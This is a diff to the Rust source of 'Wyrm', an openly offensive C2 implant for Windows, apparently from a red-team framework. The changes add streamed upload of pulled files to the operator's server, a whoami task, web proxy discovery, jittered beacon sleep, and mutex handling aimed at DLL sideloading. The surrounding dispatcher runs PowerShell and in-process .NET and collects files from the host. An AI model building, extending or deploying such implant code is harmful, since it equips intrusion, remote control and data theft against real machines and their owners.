@@ -2,11 +2,13 @@
 //! on the implant.
 
 use std::{
-    collections::VecDeque, ffi::c_void, path::PathBuf, process::exit, ptr::null_mut,
-    sync::atomic::Ordering,
+    collections::VecDeque, ffi::c_void, path::PathBuf, ptr::null_mut, sync::atomic::Ordering,
 };
 
-use rand::{Rng, rng};
+use rand::{
+    Rng, SeedableRng, TryRngCore,
+    rngs::{OsRng, SmallRng},
+};
 use serde::Serialize;
 use shared::{
     net::CompletedTasks,
@@ -21,7 +23,9 @@ use windows_sys::{
         Storage::FileSystem::GetVolumeInformationW,
         System::{
             ProcessStatus::GetModuleFileNameExW,
-            Threading::{CreateMutexA, GetCurrentProcess, GetCurrentProcessId},
+            Threading::{
+                CreateMutexA, ExitProcess, ExitThread, GetCurrentProcess, GetCurrentProcessId,
+            },
             WindowsProgramming::{GetComputerNameW, GetUserNameW, MAX_COMPUTERNAME_LENGTH},
         },
     },
@@ -29,11 +33,13 @@ use windows_sys::{
 };
 
 use crate::{
-    comms::comms_http_check_in,
+    comms::{comms_http_check_in, upload_file_as_stream},
     entry::{APPLICATION_RUNNING, IS_IMPLANT_SVC},
     execute::dotnet::execute_dotnet_current_process,
     native::{
-        accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
+        accounts::{
+            ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level, whoami,
+        },
         filesystem::{
             MoveCopyAction, PathParseType, change_directory, dir_listing, drop_file_to_disk,
             move_or_copy_file, pillage, pull_file, rm_from_fs,
@@ -43,7 +49,8 @@ use crate::{
         shell::run_powershell,
     },
     utils::{
-        comptime::translate_build_artifacts, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
+        comptime::translate_build_artifacts, proxy::resolve_web_proxy,
+        strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
     },
 };
 
@@ -97,6 +104,12 @@ impl Wyrm {
             mutex,
         ) = translate_build_artifacts();
 
+        let mutex = match WyrmMutex::new(&mutex) {
+            Some(m) => m,
+            // TODO is this safe in all circumstances for sideloading?
+            None => unsafe { ExitThread(0) },
+        };
+
         Self {
             implant_id: build_implant_id(),
             c2_config: C2Config {
@@ -124,7 +137,7 @@ impl Wyrm {
                 num_retries: 3,
             },
             agent_name_by_operator,
-            mutex: WyrmMutex::new(&mutex),
+            mutex,
         }
     }
 
@@ -163,25 +176,13 @@ impl Wyrm {
                 stop_svc_and_exit()
             }
 
-            std::process::exit(0);
+            unsafe { ExitProcess(0) };
         }
 
         //
         // Main command dispatcher
         //
-
         while let Some(task) = self.tasks.pop_front() {
-            // This is quite noisy in debug builds, enable only if needed
-            #[cfg(debug_assertions)]
-            {
-                // use shared::pretty_print::print_info;
-
-                // print_info(format!(
-                //     "Dispatching task: {}, meta: {:?}, id: {}",
-                //     task.command, task.metadata, task.id
-                // ));
-            }
-
             match task.command {
                 Command::Sleep => {
                     // In the case of a sleep, its possible it will be in the task queue
@@ -221,7 +222,7 @@ impl Wyrm {
                 Command::KillAgent => {
                     // TODO handle KA for thread vs process exit here..
                     APPLICATION_RUNNING.store(false, core::sync::atomic::Ordering::SeqCst);
-                    std::process::exit(0);
+                    unsafe { ExitProcess(0) };
                 }
                 Command::Ls => {
                     let res = dir_listing(&self.current_working_directory);
@@ -293,6 +294,7 @@ impl Wyrm {
                                 // Here we have the happy return path from the function which contains the
                                 // bytes serialised as a string, we just need to pass the result into the
                                 // completed task queue
+                                upload_file_as_stream(&self, &res);
                                 self.push_completed_task(&task, Some(res));
                             }
                             WyrmResult::Err(e) => {
@@ -323,8 +325,11 @@ impl Wyrm {
                     let result = Some(execute_dotnet_current_process(&task.metadata));
                     self.push_completed_task(&task, result);
                 }
-                // This should never be received as a task
                 Command::ConsoleMessages => (),
+                Command::WhoAmI => {
+                    let result = whoami();
+                    self.push_completed_task(&task, result);
+                }
             }
         }
     }
@@ -482,6 +487,14 @@ impl Wyrm {
 
         self.push_completed_task(&task, Some(first_run));
     }
+
+    pub fn try_get_proxy(&self) -> Option<String> {
+        if let Some(s) = resolve_web_proxy(&self).unwrap_or_default() {
+            s.proxy_url
+        } else {
+            None
+        }
+    }
 }
 
 /// Builds the implant ID, in the form: serial_hostname_username. The serial number associated with the
@@ -577,8 +590,13 @@ pub fn calculate_sleep_seconds(wyrm: &Wyrm) -> u64 {
         }
     };
 
-    let mut rng = rng();
-    rng.random_range(min_sleep..=wyrm.c2_config.sleep_seconds)
+    let mut seed = [0u8; 32];
+    if let Ok(_) = OsRng.try_fill_bytes(&mut seed) {
+        let mut rng = SmallRng::from_seed(seed);
+        rng.random_range(min_sleep..wyrm.c2_config.sleep_seconds)
+    } else {
+        1
+    }
 }
 
 struct WyrmMutex {
@@ -586,16 +604,23 @@ struct WyrmMutex {
 }
 
 impl WyrmMutex {
-    /// Constructs a new [`WyrmMutex`] setting the inner handle if we were successful. This function will
-    /// exit the application if the mutex is already registered.
-    fn new(mtx_name: &str) -> Self {
+    /// Constructs a new [`WyrmMutex`] setting the inner handle if we were successful.
+    ///
+    /// # Returns
+    /// - If the mutex was already set the function will return `None`
+    /// - If the user has not specified a mutex, the function will return `Some(null)`
+    /// - If the user HAS specified a mutex, and the mutex was created successfully, it will return `Some(handle)`
+    ///
+    /// The implication being; a FAIL path will be `None`.
+    fn new(mtx_name: &str) -> Option<Self> {
+        if mtx_name.is_empty() {
+            return Some(Self { handle: null_mut() });
+        }
+
         // Start off setting this explicitly to null, we can then add a value to it if we successfully create the
         // mutex.
 
-        let mut mtx_name = format!("Global\\{mtx_name}\0");
-        if mtx_name.len() >= MAX_PATH as usize {
-            mtx_name = mtx_name[0..MAX_PATH as usize].to_string();
-        }
+        let mut mtx_name = generate_mutex_name(mtx_name);
 
         let handle = unsafe { CreateMutexA(null_mut(), FALSE, mtx_name.as_ptr() as *const u8) };
         let last_error = unsafe { GetLastError() };
@@ -612,7 +637,7 @@ impl WyrmMutex {
                 print_failed("Mutex already exists");
             }
 
-            exit(0);
+            return None;
         }
 
         // Error check
@@ -624,16 +649,22 @@ impl WyrmMutex {
                 ));
             }
 
-            return wyrm_mutex;
+            return Some(wyrm_mutex);
         }
 
         #[cfg(debug_assertions)]
         {
+            use std::ffi::CStr;
+
             use shared::pretty_print::print_success;
-            print_success(format!("Mutex {mtx_name} registered."));
+            let s = match CStr::from_bytes_until_nul(&mtx_name) {
+                Ok(s) => s,
+                Err(_) => unsafe { CStr::from_ptr("Could not parse\0".as_ptr() as _) },
+            };
+            print_success(format!("Mutex {:?} registered.", s));
         }
 
-        wyrm_mutex
+        Some(wyrm_mutex)
     }
 }
 
